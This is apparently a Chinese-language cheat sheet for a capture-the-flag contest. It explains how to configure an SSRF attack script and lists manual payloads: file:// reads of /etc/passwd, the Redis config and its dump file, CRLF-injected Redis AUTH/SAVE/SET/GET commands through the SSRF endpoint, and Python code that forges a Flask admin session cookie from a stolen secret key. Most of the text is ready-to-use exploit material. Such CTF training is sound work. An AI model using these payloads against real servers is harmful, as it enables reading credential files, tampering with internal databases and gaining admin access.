## 二、比赛时必改的地方

### 2.1 第17行 - 目标URL（必改）

打开 `ssrf_attack.py`，找到第17行：
```python
TARGET_URL = "http://target.com"  # 目标站点URL，需要修改
```

改成比赛给的目标地址，例如：
```python
TARGET_URL = "http://192.168.1.100:5000"
```

或者：
```python
TARGET_URL = "http://10.0.0.50:8080"
```

**注意**：
- 不要漏掉 `http://`
- 端口号要写对
- 末尾不要加 `/`

## 三、可能需要改的地方（看情况）

### 3.1 第26行 - Redis密码

当前默认值：
```python
REDIS_PASSWORD = "redispass123"
```

**什么时候改**：运行脚本后，如果输出显示提取到的密码不是 `redispass123`，就改成输出显示的密码。

例如输出显示：
```
[+] 提取到Redis密码: MySecretPass456
```

就改成：
```python
REDIS_PASSWORD = "MySecretPass456"
```

### 3.2 第21行 - 管理员接口路径

当前默认值：
```python
ADMIN_USERS_ENDPOINT = "/admin/users"
```

**什么时候改**：如果访问管理员接口返回404，尝试改成：
```python
ADMIN_USERS_ENDPOINT = "/ad/users"
```

### 3.3 第18行 - SSRF漏洞端点

当前默认值：
```python
SSRF_ENDPOINT = "/api/avatar/download"
```

**什么时候改**：如果题目说SSRF漏洞在其他接口，就改成题目说的路径。

### 3.4 第25行 - Redis端口

当前默认值：
```python
REDIS_PORT = 6379
```

**什么时候改**：如果读取到的redis.conf显示端口不是6379。

## 六、手动调试方法

如果自动脚本失败，可以分步手动测试：

### 6.1 测试SSRF是否可用
在浏览器或Burp中访问：
```
http://目标地址/api/avatar/download?url=file:///etc/passwd
```
如果返回了passwd文件内容，说明SSRF可用。

### 6.2 测试读取Redis配置
```
http://目标地址/api/avatar/download?url=file:///etc/redis/redis.conf
```

### 6.3 测试CRLF注入Redis
```
http://目标地址/api/avatar/download?url=http://127.0.0.1:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE%0d%0a
```

### 6.4 读取dump文件
```
http://目标地址/api/avatar/download?url=file:///var/lib/redis/dump.rdb
```

## 九、Flask Session伪造原理（备用知识）

如果需要手动伪造cookie，可以用以下Python代码：

```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

secret_key = "这里填提取到的secret_key"

serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}

s = URLSafeTimedSerializer(
    secret_key,
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)

session_data = {
    'username': 'admin',
    'user_id': 1,
    'is_admin': True,
    'logged_in': True
}

forged_cookie = s.dumps(session_data)
print(f"伪造的cookie: {forged_cookie}")
```

## 十、CRLF注入Redis命令格式

### 10.1 基本格式
```
http://127.0.0.1:6379/%0d%0a命令1%0d%0a命令2%0d%0a
```

### 10.2 带密码认证
```
http://127.0.0.1:6379/%0d%0aAUTH%20密码%0d%0a命令%0d%0a
```

### 10.3 常用命令示例

**执行SAVE**：
```
http://127.0.0.1:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE%0d%0a
```

**写入数据**：
```
http://127.0.0.1:6379/%0d%0aAUTH%20redispass123%0d%0aSET%20key%20value%0d%0a
```

**读取数据**（无回显，需要通过dump文件读取）：
```
http://127.0.0.1:6379/%0d%0aAUTH%20redispass123%0d%0aGET%20app:secret_key%0d%0a
```

## 十一、紧急情况处理

### 11.1 如果脚本完全不工作
1. 先用浏览器手动测试SSRF是否可用
2. 检查TARGET_URL是否正确
3. 检查网络是否能访问目标

### 11.2 如果某一步失败
1. 看错误信息判断是哪一步
2. 对照上面的"常见错误及解决方法"表格
3. 尝试手动调试该步骤

### 11.3 如果路径都不对
常见的路径变体：
- `/api/xxx` vs `/xxx`
- `/admin/xxx` vs `/ad/xxx`
- `online-users` vs `online_users`（连字符vs下划线）
